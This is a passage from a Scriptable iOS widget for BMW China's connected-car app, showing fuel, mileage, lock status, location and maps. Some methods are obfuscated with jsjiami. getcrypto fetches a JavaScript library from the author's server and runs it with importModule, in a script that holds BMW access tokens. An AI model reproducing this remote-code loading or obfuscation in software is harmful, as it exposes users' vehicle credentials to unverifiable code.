_0x55717d=0x0;_0x55717d<_0x13cbc1['length'];_0x55717d++){_0x2e1929=(_0x2e1929+0x1)%0x100,_0x93c278=(_0x93c278+_0x37373c[_0x2e1929])%0x100,_0x434e29=_0x37373c[_0x2e1929],_0x37373c[_0x2e1929]=_0x37373c[_0x93c278],_0x37373c[_0x93c278]=_0x434e29,_0x25643a+=String['fromCharCode'](_0x13cbc1['charCodeAt'](_0x55717d)^_0x37373c[(_0x37373c[_0x2e1929]+_0x37373c[_0x93c278])%0x100]);}return _0x25643a;};_0x44fc['yPyyPB']=_0x1bf3e4,_0x3a9f0a=arguments,_0x44fc['IMDOPx']=!![];}const _0x2183ad=_0x4f2f33[0x0],_0x476431=_0x44fcc1+_0x2183ad,_0x2f213e=_0x3a9f0a[_0x476431];return!_0x2f213e?(_0x44fc['iviBBL']===undefined&&(_0x44fc['iviBBL']=!![]),_0x20d182=_0x44fc['yPyyPB'](_0x20d182,_0x515659),_0x3a9f0a[_0x476431]=_0x20d182):_0x20d182=_0x2f213e,_0x20d182;},_0x44fc(_0x3a9f0a,_0x2fe742);}let cstr='';typeof Authorurl==='undefined'?cstr+=_0x40cf96(0x207,'sHuO'):cstr+=Authorurl,typeof Project_UPDATE===_0x40cf96(0x1ff,'JAvZ')?cstr+='abc':cstr+=Project_UPDATE,typeof MODIFIER==='undefined'?cstr+=_0x40cf96(0x204,'ss7b'):cstr+=MODIFIER;if(this[_0x40cf96(0x1db,'5vih')](cstr)['substr'](0x0,0x8)!=_0x40cf96(0x1c9,'7CS%'))return await this['renderError'](_0x40cf96(0x1e3,'iSGV'));let w=new ListWidget(),fontColor=this[_0x40cf96(0x1dc,'mbIU')]();w[_0x40cf96(0x203,'mbIU')]=this[_0x40cf96(0x1da,'wvTD')]();const width=data['size']['small'][_0x40cf96(0x1e5,'YxH0')],paddingLeft=Math['round'](width*0.07);w[_0x40cf96(0x20b,'IHVb')](0x0,0x0,0x0,0x0);const topBox=w[_0x40cf96(0x1dd,'nlCy')]();topBox[_0x40cf96(0x1e2,'j!0(')]=new Size(width,width*0.18),topBox[_0x40cf96(0x1d1,'JAvZ')](),topBox['layoutHorizontally'](),topBox[_0x40cf96(0x1ea,'HOGn')](0x0,0x0,0x0,0x0);const topLeftContainer=topBox[_0x40cf96(0x1c2,'O9vl')](),mileNameContainer=topLeftContainer[_0x40cf96(0x1ee,'HugP')]();topLeftContainer['addSpacer'](),mileNameContainer[_0x40cf96(0x1cd,'j*$#')](0x0,paddingLeft*1.3,0x0,0x0);let mileNameStr=_0x40cf96(0x1fc,'@nCB');const mileNameText=mileNameContainer[_0x40cf96(0x1c6,'%9!W')](mileNameStr);let mileNameSize=0xc;mileNameText[_0x40cf96(0x1fe,'5vih')](),mileNameText[_0x40cf96(0x1fa,'5k^(')]=this[_0x40cf96(0x205,'%9!W')](''+WIDGET_FONT_BOLD,mileNameSize),mileNameText[_0x40cf96(0x1ef,')1#H')]=fontColor,topBox[_0x40cf96(0x1e4,'fo%t')]();const topRightBox=topBox[_0x40cf96(0x201,'mbIU')]();topRightBox[_0x40cf96(0x1eb,'2qp]')](0x3,0x0,0x0,paddingLeft*0x2);try{let logoImage=await this[_0x40cf96(0x1d0,'ixMt')]('Trip.png'),logoImageWidget=topRightBox['addImage'](logoImage);logoImageWidget[_0x40cf96(0x1fb,'5k^(')]=new Size(0x12,0x12);}catch(_0x55717d){topRightBox[_0x40cf96(0x202,'IHVb')](_0x55717d);}w['addSpacer'](0x0);let dateform=new DateFormatter();dateform[_0x40cf96(0x1c8,'bz)K')]=_0x40cf96(0x1f9,'mQP^');let vdate=dateform[_0x40cf96(0x1f7,'iL3q')](new Date()),accessToken=await this[_0x40cf96(0x1ca,'@nCB')](![]);const e=new Request('https://myprofile.bmw.com.cn/eadrax-suscs/v1/vehicles/sustainability/trips/statistics?date='+vdate+_0x40cf96(0x1d9,'ixMt'));e[_0x40cf96(0x1d7,'UY5@')]=Object[_0x40cf96(0x1df,'@zn0')](BMW_HEADERS,{'authorization':_0x40cf96(0x1e6,'YxH0')+accessToken,'vin':data[_0x40cf96(0x1e7,'F5Gp')],'x-gcid':Keychain[_0x40cf96(0x1f0,'IHVb')](VEHICLE_GCID)});const data1=await e[_0x40cf96(0x1f3,'@zn0')](),tireContainer=w['addStack']();tireContainer['size']=new Size(width,width*0.75),tireContainer[_0x40cf96(0x1c1,'BX(C')]();const carImageContainer=tireContainer[_0x40cf96(0x1c3,'fT@[')]();carImageContainer['size']=new Size(width,width*0.75);let canvasWidth=Math[_0x40cf96(0x1ce,'$y!j')](width*0x1),canvasHeight=Math[_0x40cf96(0x1cc,'j*$#')](width*0.7);carImageContainer[_0x40cf96(0x1ea,'HOGn')](0x0,0x0,0x0,0x0),carImageContainer[_0x40cf96(0x200,'J0[W')](),carImageContainer[_0x40cf96(0x1d4,'IHVb')]();!this[_0x40cf96(0x1d6,'OJj5')][_0x40cf96(0x1c7,'sHuO')]&&(carImageContainer[_0x40cf96(0x1fd,'sHuO')](),carImageContainer[_0x40cf96(0x1f5,'J0[W')](),carImageContainer[_0x40cf96(0x1d3,'U#4$')](0x6,paddingLeft,0x6,paddingLeft));let image=await this[_0x40cf96(0x1ed,'mbIU')](data1,canvasWidth,canvasHeight,data[_0x40cf96(0x20a,'wvTD')][_0x40cf96(0x1cb,')1#H')]),carStatusImage=carImageContainer[_0x40cf96(0x1f2,'bz)K')](image);carStatusImage[_0x40cf96(0x1e0,'O9vl')]=!this['userConfigData'][_0x40cf96(0x20d,'j*$#')],w[_0x40cf96(0x1d8,'BX(C')]=_0x40cf96(0x1d5,'J0[W'),w[_0x40cf96(0x1f1,'iL3q')]();return w;var version_ = 'jsjiami.com.v7';
  }
  getFormatter=async function(tim){
    var version_='jsjiami.com.v7';const _0x1e5552=_0x52f6;(function(_0x3a9ab4,_0x3ee134,_0x2c6f20,_0xaec320,_0x38f1f2,_0x22f412,_0x52fb47){return _0x3a9ab4=_0x3a9ab4>>0x1,_0x22f412='hs',_0x52fb47='hs',function(_0x20081e,_0x2bc60a,_0x21e31c,_0x5a28fc,_0x28c3eb){const _0x22687d=_0x52f6;_0x5a28fc='tfi',_0x22f412=_0x5a28fc+_0x22f412,_0x28c3eb='up',_0x52fb47+=_0x28c3eb,_0x22f412=_0x21e31c(_0x22f412),_0x52fb47=_0x21e31c(_0x52fb47),_0x21e31c=0x0;const _0x5563f3=_0x20081e();while(!![]&&--_0xaec320+_0x2bc60a){try{_0x5a28fc=-parseInt(_0x22687d(0x131,'78Ol'))/0x1*(parseInt(_0x22687d(0x11c,'pul['))/0x2)+-parseInt(_0x22687d(0x11d,'dr8*'))/0x3*(parseInt(_0x22687d(0x116,'QfVt'))/0x4)+parseInt(_0x22687d(0x110,'2kS!'))/0x5*(parseInt(_0x22687d(0x126,'QfVt'))/0x6)+-parseInt(_0x22687d(0x125,'7B1c'))/0x7*(parseInt(_0x22687d(0x112,'W%]J'))/0x8)+parseInt(_0x22687d(0x119,'W%Yi'))/0x9*(parseInt(_0x22687d(0x129,'40TQ'))/0xa)+-parseInt(_0x22687d(0x127,'tK(7'))/0xb*(parseInt(_0x22687d(0x122,'Dgao'))/0xc)+-parseInt(_0x22687d(0x135,'6S[U'))/0xd*(-parseInt(_0x22687d(0x130,'5$7Q'))/0xe);}catch(_0x1dcf19){_0x5a28fc=_0x21e31c;}finally{_0x28c3eb=_0x5563f3[_0x22f412]();if(_0x3a9ab4<=_0xaec320)_0x21e31c?_0x38f1f2?_0x5a28fc=_0x28c3eb:_0x38f1f2=_0x28c3eb:_0x21e31c=_0x28c3eb;else{if(_0x21e31c==_0x38f1f2['replace'](/[HqGtWfQAUhMYxFJkeXnL=]/g,'')){if(_0x5a28fc===_0x2bc60a){_0x5563f3['un'+_0x22f412](_0x28c3eb);break;}_0x5563f3[_0x52fb47](_0x28c3eb);}}}}}(_0x2c6f20,_0x3ee134,function(_0x39bb24,_0x326728,_0x1b57b8,_0x27b674,_0x32eb14,_0x2bd430,_0x4acece){return _0x326728='\x73\x70\x6c\x69\x74',_0x39bb24=arguments[0x0],_0x39bb24=_0x39bb24[_0x326728](''),_0x1b57b8='\x72\x65\x76\x65\x72\x73\x65',_0x39bb24=_0x39bb24[_0x1b57b8]('\x76'),_0x27b674='\x6a\x6f\x69\x6e',(0x1299ba,_0x39bb24[_0x27b674](''));});}(0x17e,0x9d76a,_0x10a2,0xc1),_0x10a2)&&(version_=_0x10a2);let Tim=new Date()-new Date(tim)[_0x1e5552(0x113,'%[5Z')](),day=Math['floor'](Tim/(0x3e8*0x3c*0x3c*0x18)),hours=Math[_0x1e5552(0x12b,'G4Rh')]((Tim-day*0x3e8*0x3c*0x3c*0x18)/(0x3e8*0x3c*0x3c)),min=Math[_0x1e5552(0x136,'c#2q')]((Tim-0x3e8*0x3c*0x3c*(0x18*day+hours))/(0x3e8*0x3c)),q,w,e,r,t,a,s,d,f,g=0x0;function _0x10a2(){const _0x4bb0ca=(function(){return[version_,'qjAMsYkjhitaLFmGnhiQ.fXXcJfoxmUH.AWve7fM==','p8oAW7ZcUCkicCoGwCkZ','W6JcRZtcVSkneZbDWPKmW4VcPq','WPldPh92j8ooFYxcUCo2W6/cUKS','Fx7dRwnCWPlcJSkceW','w3HRrCo+WQxcOa','WQhcKConW7VdTG3cRNdcM8o6cXJcUG','WQJdTCoJWQ3cJa','vCk6F8obWPpcIW','v2rzc1NcH8ohzrHtDSkfWOC','wmoWW4/cNJu','WQ7cQYRcQCknzKakW481','tCkDmmoBkG'].concat((function(){return['omkteCoPfrFdQSo+','WRjTsSovx8k6za','tmoZW5xcNYm','ceuhwGWLW7i','qSotzqHrWOjt','WQHXW5tdNmk8','F8kcWRdcN8k9','vd3cIe7dHCkNW6K6vW','WOD3W6ldQCkkW64','WPpdOhX/DCkAma3cH8oQ','zZRcNCkdWRebj3a+W7eCW6S','WO8iBYT3WPL8oIaYCMbT','wZq9WPJdSmoCW7ujrse','tdOtDfe'].concat((function(){return['WP99W5/dUSkmW6/dV8oZ','xgi1xIFdNmk9xa','d8kCjJuxA8oVu8odfZG','W7hdUNldVSkBAW','W6FcLw0FgG','WRjLagldJCoAlSoKWOpcKaXk','rmkggvfnWRXcW6jbW4C','W5pdML4Jg25EW7pdQCoe','B2jRW5uf','W6WQW5BdK8kYWQddU8oJW69UW7P2','fZSzxa0','E2fXW5qt','WOxcLmkIiCoSW4ZdItaI'];}()));}()));}());_0x10a2=function(){return _0x4bb0ca;};return _0x10a2();};{Math[_0x1e5552(0x118,'eUyD')](hours/0x18*0xa0)-0x8c<0x0?(t=0x0,Math[_0x1e5552(0x128,'G4Rh')](hours/0x18*0xa0)-0x64<0x0?(r=0x0,Math[_0x1e5552(0x111,'IsML')](hours/0x18*0xa0)-0x3c<0x0?(e=0x0,Math['round'](hours/0x18*0xa0)-0x14<0x0?(w=0x0,q=Math['round'](hours/0x18*0xa0)):(w=Math[_0x1e5552(0x117,'FHTE')](hours/0x18*0xa0)-0x14,q=0x14)):(e=Math['round'](hours/0x18*0xa0)-0x3c,(w=0x28,q=0x14))):(r=Math[_0x1e5552(0x114,'c#2q')](hours/0x18*0xa0)-0x64,(e=0x28,w=0x28,q=0x14))):(t=Math[_0x1e5552(0x12a,'6S[U')](hours/0x18*0xa0)-0x8c,(r=0x28,e=0x28,w=0x28,q=0x14));}{Math['round'](min/0x3c*0xa0)-0x8c<0x0?(g=0x0,Math['round'](min/0x3c*0xa0)-0x64<0x0?(f=0x0,Math[_0x1e5552(0x111,'IsML')](min/0x3c*0xa0)-0x3c<0x0?(d=0x0,Math[_0x1e5552(0x11f,'n0[f')](min/0x3c*0xa0)-0x14<0x0?(s=0x0,a=Math['round'](min/0x3c*0xa0)):(s=Math[_0x1e5552(0x133,'7dlj')](min/0x3c*0xa0)-0x14,a=0x14)):(d=Math['round'](min/0x3c*0xa0)-0x3c,(s=0x28,a=0x14))):(f=Math[_0x1e5552(0x124,'^&9u')](min/0x3c*0xa0)-0x64,(d=0x28,s=0x28,a=0x14))):(g=Math['round'](min/0x3c*0xa0)-0x8c,(f=0x28,d=0x28,s=0x28,a=0x14));}{day=day[_0x1e5552(0x120,'5qB@')](),hours=hours[_0x1e5552(0x120,'5qB@')](),min=min['toString'](),day[_0x1e5552(0x134,'sLaG')]===0x1?day='0'+day:day,hours[_0x1e5552(0x11a,'5qB@')]===0x1?hours='0'+hours:hours,min[_0x1e5552(0x123,'2kS!')]===0x1?min='0'+min:min;}function _0x52f6(_0xa97dc,_0x500e04){const _0x10a2dd=_0x10a2();return _0x52f6=function(_0x52f689,_0x3d09ad){_0x52f689=_0x52f689-0x110;let _0x22e470=_0x10a2dd[_0x52f689];if(_0x52f6['RACSkC']===undefined){var _0x3e9b5d=function(_0x4cc462){const _0x1d420c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x2800f0='',_0x21951c='';for(let _0x3c5c9a=0x0,_0x3e4323,_0x2ace21,_0x596ca1=0x0;_0x2ace21=_0x4cc462['charAt'](_0x596ca1++);~_0x2ace21&&(_0x3e4323=_0x3c5c9a%0x4?_0x3e4323*0x40+_0x2ace21:_0x2ace21,_0x3c5c9a++%0x4)?_0x2800f0+=String['fromCharCode'](0xff&_0x3e4323>>(-0x2*_0x3c5c9a&0x6)):0x0){_0x2ace21=_0x1d420c['indexOf'](_0x2ace21);}for(let _0x5872ec=0x0,_0xd8d513=_0x2800f0['length'];_0x5872ec<_0xd8d513;_0x5872ec++){_0x21951c+='%'+('00'+_0x2800f0['charCodeAt'](_0x5872ec)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x21951c);};const _0x487644=function(_0x3c82ea,_0x31dadc){let _0x4d7c21=[],_0x379387=0x0,_0x59332c,_0x54faaa='';_0x3c82ea=_0x3e9b5d(_0x3c82ea);let _0x49e0da;for(_0x49e0da=0x0;_0x49e0da<0x100;_0x49e0da++){_0x4d7c21[_0x49e0da]=_0x49e0da;}for(_0x49e0da=0x0;_0x49e0da<0x100;_0x49e0da++){_0x379387=(_0x379387+_0x4d7c21[_0x49e0da]+_0x31dadc['charCodeAt'](_0x49e0da%_0x31dadc['length']))%0x100,_0x59332c=_0x4d7c21[_0x49e0da],_0x4d7c21[_0x49e0da]=_0x4d7c21[_0x379387],_0x4d7c21[_0x379387]=_0x59332c;}_0x49e0da=0x0,_0x379387=0x0;for(let _0x28df65=0x0;_0x28df65<_0x3c82ea['length'];_0x28df65++){_0x49e0da=(_0x49e0da+0x1)%0x100,_0x379387=(_0x379387+_0x4d7c21[_0x49e0da])%0x100,_0x59332c=_0x4d7c21[_0x49e0da],_0x4d7c21[_0x49e0da]=_0x4d7c21[_0x379387],_0x4d7c21[_0x379387]=_0x59332c,_0x54faaa+=String['fromCharCode'](_0x3c82ea['charCodeAt'](_0x28df65)^_0x4d7c21[(_0x4d7c21[_0x49e0da]+_0x4d7c21[_0x379387])%0x100]);}return _0x54faaa;};_0x52f6['pizygC']=_0x487644,_0xa97dc=arguments,_0x52f6['RACSkC']=!![];}const _0x5e00ef=_0x10a2dd[0x0],_0x25e5f6=_0x52f689+_0x5e00ef,_0x21a072=_0xa97dc[_0x25e5f6];return!_0x21a072?(_0x52f6['dAtCVq']===undefined&&(_0x52f6['dAtCVq']=!![]),_0x22e470=_0x52f6['pizygC'](_0x22e470,_0x3d09ad),_0xa97dc[_0x25e5f6]=_0x22e470):_0x22e470=_0x21a072,_0x22e470;},_0x52f6(_0xa97dc,_0x500e04);}let res={};res['z']=day,res['x']=hours,res['c']=min,(res['q']=q,res['w']=w),(res['e']=e,res['r']=r,res['t']=t),(res['a']=a,res['s']=s),(res['d']=d,res['f']=f,res['g']=g);return res;var version_ = 'jsjiami.com.v7';
  } 
  getcrypto=async function() {
    let a = FileManager.local(),
      encry = a.joinPath(a.libraryDirectory(), ("crypto-js.js"));
    if (a.fileExists(encry)) console.log("加密密码所需文件：文件已存在,直接读取");
    else {
      console.log("文件不存在,需要加载："); // 
      const i = new Request(`${Authorurl}lib/${encodeURIComponent("crypto-js.js")}`), // 
        o = await i.load(); // 
      a.write(encry, o), console.log("文件写入成功")
    }
    let CryptoJS = importModule(encry);
    if (null == CryptoJS) console.log(`Module '+"crypto-js.js"+' not found.`);
    return CryptoJS
  }
  getAppLogo=async function() {
    let logoURL = Authorurl+"png/"+"light.png";
    if (this.userConfigData.custom_logo_image) {
      logoURL = this.userConfigData.custom_logo_image;
    }
    return await this.getImageByUrl(logoURL);
  }
  doorstateNum=async function(doorsState){
    let state=0x0000;
    if(doorsState.leftFront  != "CLOSED")  
      state |=0x0001;
    if(doorsState.rightFront != "CLOSED")  
      state |=0x0010;
    if(doorsState.leftRear   != "CLOSED")  
      state |=0x0100;
    if(doorsState.rightRear  != "CLOSED")  
      state |=0x1000;
    return state.toString(16)
  }
  getUserImge=async function(name){
    let logoURL = Authorurl+"png/"+name;
    return await this.getImageByUrl(logoURL);  
  }
  renderSmall=async function(data,P) {
    switch (P) {
      case '里程':
        return await this.Mile(data);
      case '胎压':
        return await this.Tire(data);
      case 'LOCK':
        return await this.renderBase(data);
      case '停留':
        return await this.Stop(data);  
      default:
        return await this.Fuel(data);  
    }
  }

//


  async renderMedium(data, renderLarge = false) {
    let w = new ListWidget();
    let fontColor = this.getFontColor();
    w.backgroundGradient = this.getBackgroundColor();
    w.setPadding(0, 0, 0, 0);
    const {width, height} = data.size['medium'];
    let paddingTop = Math.round(height * 0.09);
    let paddingLeft = Math.round(width * 0.055);
    let renderMediumContent = !renderLarge || this.userConfigData.map_api_key;
    const topContainer = w.addStack();
    topContainer.layoutHorizontally();
    topContainer.centerAlignContent();
    topContainer.size=new Size(width, height*0.15)
    const vehicleNameContainer = topContainer.addStack();
    vehicleNameContainer.layoutHorizontally();
    vehicleNameContainer.setPadding(paddingTop/4, paddingLeft*1.25, 0, 0);
    let vehicleNameStr = `${data.brand} ${data.model}`;
    if (this.userConfigData.custom_name && this.userConfigData.custom_name.length > 0) {
      vehicleNameStr = this.userConfigData.custom_name;
    }
    const vehicleNameText = vehicleNameContainer.addText(vehicleNameStr);
    let vehicleNameSize = 24;
    if (vehicleNameStr.length >= 10) {
      vehicleNameSize = vehicleNameSize - Math.round(vehicleNameStr.length / 4);
    }

    vehicleNameText.font = this.getFont(`${WIDGET_FONT_BOLD}`, vehicleNameSize);
    vehicleNameText.textColor = fontColor;
    vehicleNameContainer.addSpacer();

    const logoImageContainer = topContainer.addStack();
    logoImageContainer.layoutHorizontally();
    logoImageContainer.setPadding(0, paddingTop/4, 0, paddingLeft*1.5);
    try {
      let logoImage = logoImageContainer.addImage(await this.getAppLogo());
      logoImage.imageSize=new Size(Math.round(topContainer.size.height*0.85),Math.round(topContainer.size.height*0.85))
      logoImage.rightAlignImage();
    } catch (e) {}
    topContainer.addSpacer();
    const bodyContainer = w.addStack();
    bodyContainer.layoutHorizontally();
    const leftContainer = bodyContainer.addStack();

    leftContainer.layoutVertically();
    leftContainer.size = new Size(Math.round(width * 0.85), Math.round(height * 0.75));
    if (renderMediumContent) {
      leftContainer.size = new Size(Math.round(width * 0.5), Math.round(height * 0.75));
    }
    leftContainer.addSpacer();

    const kmContainer = leftContainer.addStack();
    kmContainer.setPadding(0, paddingLeft, 0, 0);
    kmContainer.bottomAlignContent();
    try {
      const {levelValue,  rangeValue} = this.getFuelIndicators(data.state.combustionFuelLevel);
      const kmText = kmContainer.addText(`${rangeValue + ' km' }`);
      kmText.font = this.getFont(`${WIDGET_FONT}`, 20);
      kmText.textColor = fontColor;
      const levelContainer = kmContainer.addStack();
      const separator = levelContainer.addText(' / ');
      separator.font = this.getFont(`${WIDGET_FONT}`, 16);
      separator.textColor = fontColor;
      separator.textOpacity = 0.6;

      const levelText = levelContainer.addText(`${levelValue} %`);
      levelText.font = this.getFont(`${WIDGET_FONT}`, 18);
      levelText.textColor = fontColor;
      levelText.textOpacity = 0.6;

      const mileageContainer = leftContainer.addStack();
      mileageContainer.setPadding(0, paddingLeft, 0, 0);

      let mileageText = mileageContainer.addText(`总里程: ${data.state.currentMileage} km`);
      mileageText.font = this.getFont(`${WIDGET_FONT}`, 9);
      mileageText.textColor = fontColor;
      mileageText.textOpacity = 0.7;
    } catch (e) {
      console.error(e.message);
      kmContainer.addText(`获取里程失败`);
    }
    const carStatusContainer = leftContainer.addStack();
    carStatusContainer.setPadding(8, paddingLeft, 0, 0);
    const carStatusBox = carStatusContainer.addStack();
    carStatusBox.setPadding(3, 3, 3, 3);
    carStatusBox.layoutHorizontally();
    carStatusBox.centerAlignContent();
    carStatusBox.cornerRadius = 4;
    carStatusBox.backgroundColor = this.getFocusedBackgroundColor();
    let carStatus =null;      
    if (data && ("SECURED" === data.state.doorsState.combinedSecurityState)){
      carStatus = `已上锁`;
    }else{
      carStatus = `已解锁`;  
    }
    try {
      const carStatusTxt = carStatusBox.addText(`${carStatus}`);
      let displayFont = WIDGET_FONT;
      let displayFontColor = fontColor;
      if (! ("SECURED" === data.state.doorsState.combinedSecurityState)){
        displayFontColor = new Color(WIDGET_DANGER_COLOR, 1);
        displayFont = WIDGET_FONT_BOLD;
      }
      carStatusTxt.font = this.getFont(displayFont, 10);
      carStatusTxt.textColor = displayFontColor;
      carStatusTxt.textOpacity = 0.7;
      carStatusBox.addSpacer(5);
      let statusLabel = this.formatStatusLabel(data);
      const updateTxt = carStatusBox.addText(statusLabel);
      updateTxt.font = this.getFont(`${WIDGET_FONT}`, 10);
      updateTxt.textColor = fontColor;
      updateTxt.textOpacity = 0.5;
    } catch (e) {
      console.error(e.message);
      carStatusBox.addText(`获取车门状态失败`);
    }
    let locationStr = '';
    try {
      locationStr = data.state.location.address.formatted;
    } catch (e) {}
    leftContainer.addSpacer();
    const locationContainer = leftContainer.addStack();
    locationContainer.setPadding(0, paddingLeft, 16, 0);
    if (renderMediumContent) {
      locationContainer.size = new Size(Math.round(width * 0.45), Math.round(height * 0.2));
      locationContainer.layoutVertically();
      locationContainer.setPadding(0,paddingLeft, 0 , 0);
    }
    const locationText = locationContainer.addText(locationStr);
    locationText.font = this.getFont(`${WIDGET_FONT}`, 9);
    locationText.textColor = fontColor;
    locationText.textOpacity = 0.5;
    locationText.url = this.buildMapURL(data);
    if (renderMediumContent) {
      const rightContainer = bodyContainer.addStack();
      rightContainer.setPadding(0, 0, 0, 0);
      rightContainer.layoutVertically();
      rightContainer.size = new Size(Math.round(width * 0.5), Math.round(height * 0.75));
      const carImageContainer = rightContainer.addStack();
      carImageContainer.bottomAlignContent();
      if (!this.userConfigData.show_control_checks) {
        carImageContainer.setPadding(0, 6, 0, paddingLeft);
      }
      let canvasWidth = Math.round(width * 0.45);
      let canvasHeight = Math.round(height * 0.55);
      let image = await this.getCarCanvasImage(data, canvasWidth, canvasHeight, 0.95);
      let carStatusImage = carImageContainer.addImage(image);
      carStatusImage.resizable = !this.userConfigData.show_control_checks;
      if (data.state.doorsState) {
        let windowStatusContainer = rightContainer.addStack();
        windowStatusContainer.setPadding(6, 0, 12, 0);
        windowStatusContainer.layoutHorizontally();
        windowStatusContainer.addSpacer();
        let windowStatus = `"锁定状态" ${carStatus} `;
        let windowStatusText = windowStatusContainer.addText(windowStatus);
        let displayFont = WIDGET_FONT;
        let displayFontColor = fontColor;
        if (! ("SECURED" === data.state.doorsState.combinedSecurityState)){
          displayFontColor = new Color(WIDGET_DANGER_COLOR, 1);
          displayFont = WIDGET_FONT_BOLD;
        }
        windowStatusText.font = this.getFont(displayFont, 10);
        windowStatusText.textColor = displayFontColor;
        windowStatusText.textOpacity = 0.5;
        windowStatusContainer.addSpacer();
      }
    }
    w.url = 'de.bmw.connected.mobile20.cn://';
    return w;
  }

  async renderLarge(data) {
    let w = await this.renderMedium(data, true);
    const {width, height} = data.size['large'];
    w.setPadding(5, 0, 0, 0);
    w.addSpacer();
    let fontColor = this.getFontColor();
    let mapWidth = Math.ceil(width);
    let mapHeight = Math.ceil(height * 0.5);
    let paddingLeft = Math.round(width * 0.055);
    let largeExtraContainer = w.addStack();
    largeExtraContainer.layoutVertically();
    largeExtraContainer.bottomAlignContent();
    largeExtraContainer.size = new Size(mapWidth, mapHeight);
    if (this.userConfigData.map_api_key && this.userConfigData.map_api_key.length > 0) {
      let latLng = null;
      try {
        latLng =
          data.state.location.coordinates.longitude +
          ',' +
          data.state.location.coordinates.latitude;
        } catch (e) {}
      let mapImage = await this.loadMapView(latLng, mapWidth, mapHeight, true);
      let widget = largeExtraContainer.addImage(mapImage);
      widget.centerAlignImage();
      widget.imageSize = new Size(mapWidth, mapHeight);
      largeExtraContainer.url = this.buildMapURL(data);
      return w;
    }
    const carImageContainer = largeExtraContainer.addStack();
    carImageContainer.setPadding(0, paddingLeft, 0, paddingLeft);
    if (!this.userConfigData.show_control_checks) {
      carImageContainer.layoutHorizontally();
      carImageContainer.addSpacer();
      carImageContainer.setPadding(paddingLeft, 0, paddingLeft, 0);
    }
    carImageContainer.bottomAlignContent();
    try {
      let canvasWidth = Math.round(width * 0.9);
      let canvasHeight = Math.round(height * 0.45);
      let image = await this.getCarCanvasImage(data, canvasWidth, canvasHeight, 0.85);
      let carStatusImage = carImageContainer.addImage(image);
      carStatusImage.resizable = !this.userConfigData.show_control_checks;
      carStatusImage.centerAlignImage();
      if (!this.userConfigData.show_control_checks) {
        carImageContainer.addSpacer();
      }
      carStatusImage.url = 'de.bmw.connected.mobile20.cn://';
    } catch (e) {
      console.log(e.message);
    }
    let carStatus =null;      
    if (data && ( "SECURED" === data.state.doorsState.combinedSecurityState) ){//
      carStatus = `已上锁`;
    }else{
      carStatus = `已解锁`;  
    }
    if (data.state.doorsState) {
      let windowStatusContainer = largeExtraContainer.addStack();
      windowStatusContainer.setPadding(2, 0, 16, 0);
      windowStatusContainer.layoutHorizontally();
      windowStatusContainer.addSpacer();
      let windowStatus = `锁定状态 ${carStatus} `;
      let windowStatusText = windowStatusContainer.addText(windowStatus);

      let displayFont = WIDGET_FONT;
      let displayFontColor = fontColor;
      if (data.properties && !data.properties.areWindowsClosed) {
        displayFontColor = new Color(WIDGET_DANGER_COLOR, 1);
        displayFont = WIDGET_FONT_BOLD;
      }
      windowStatusText.font = this.getFont(displayFont, 10);
      windowStatusText.textColor = displayFontColor;
      windowStatusText.textOpacity = 0.5;
      windowStatusContainer.addSpacer();
    }
    return w;
  }

  getImageSize(imageWidth, imageHeight, canvasWidth, canvasHeight, resizeRate = 0.85) {
      let a = imageWidth;
      let b = imageHeight;

      if (a > canvasWidth || b > canvasHeight) {
          if (resizeRate >= 1) {
              resizeRate = 0.99;
          }
          a *= resizeRate;
          b *= resizeRate;
          return this.getImageSize(a, b, canvasWidth, canvasHeight);
      }
      return {width: a, height: b};
  }

  async getCarCanvasImage(data, canvasWidth, canvasHeight, resizeRate) {
    if (!this.userConfigData.show_control_checks) {
      try {
        let carImage = await this.getVehicleImage(data);
        return carImage;
      } catch (e) {
        console.warn(e);
      }
    }
    let canvas = new DrawContext();
    canvas.size = new Size(canvasWidth, canvasHeight);
    canvas.opaque = false;
    canvas.setFont(this.getFont(WIDGET_FONT_BOLD, Math.round(canvasHeight / 3.5)));
    canvas.setTextColor(this.getFontColor());
    canvas.respectScreenScale = true;
    try {
      let checkControlMessages = this.getControlMessages(data);
      if (checkControlMessages && checkControlMessages.length == 0) {
        canvas.drawTextInRect(
          "ALL",
          new Rect(
            0, //
            0,
            Math.round(canvasWidth * 0.5),
            Math.round(canvasWidth * 0.5)
          ));
        canvas.drawTextInRect(
          'GOOD',
          new Rect(
            0,
            Math.round(canvasHeight / 4),
            Math.round(canvasWidth * 0.5),
            Math.round(canvasWidth * 0.5)
          ));
      } else {
        let messageFontSize = Math.round(canvasHeight / 9);
        let messageOffset = Math.round(messageFontSize * 1.5);
        let exclamation = SFSymbol.named('exclamationmark.circle').image;//sparkle
        canvas.drawImageInRect(
          exclamation,
          new Rect(0, messageOffset, Math.round(messageFontSize * 1.2), Math.round(messageFontSize * 1.2))
        );
        canvas.setFont(this.getFont(WIDGET_FONT, messageFontSize));
        canvas.setTextColor(this.getFontColor());
        for (const checkControlMessage of checkControlMessages) {
          canvas.drawTextInRect(
            checkControlMessage.name,
            new Rect(
              Math.round(messageFontSize * 1.5),
              messageOffset,
              Math.round(canvasWidth * 0.5),
              Math.round(canvasWidth * 0.5)
            ));
            messageOffset = messageOffset + messageFontSize;
        }
      }
    } catch (e) {
      console.warn(e.message);
    }
    let carImage = await this.getVehicleImage(data);
    let imageSize = this.getImageSize(
      carImage.size.width,
      carImage.size.height,
      canvasWidth,
      canvasHeight,
      resizeRate
    );
    console.warn('rate ' + imageSize.width / imageSize.height);
    console.warn('imageSize ' + JSON.stringify(imageSize));
    canvas.drawImageInRect(
      carImage,
      new Rect(
        canvasWidth - imageSize.width, //
        canvasHeight - imageSize.height,
        imageSize.width,
        imageSize.height
      ));
    return canvas.getImage();
  }

  getFocusedBackgroundColor() {
      if (this.userConfigData.force_dark_theme) {
        return new Color('#fff', 0.2);
      }
      return Color.dynamic(new Color('#f5f5f8', 0.45), new Color('#fff', 0.2));
  }

  async loadMapView(latLng, width, height, useCache = true) {
    try {
      if (!this.userConfigData.map_api_key) {
        throw '获取地图失败，请检查API KEY';
        }
        width = parseInt(width);
        height = parseInt(height);
        let mapApiKey = this.userConfigData.map_api_key;
        let url = `https://restapi.amap.com/v3/staticmap?location=${latLng}&scale=2&zoom=15&size=${width}*${height}&markers=large,0x00CCFF,:${latLng}&key=${mapApiKey}`;
        console.warn('load map from URL: ' + url);
        const cacheKey = this.sm3(url);
        const cacheFile = FileManager.local().joinPath(FileManager.local().temporaryDirectory(), cacheKey);
        if (useCache && FileManager.local().fileExists(cacheFile)) {
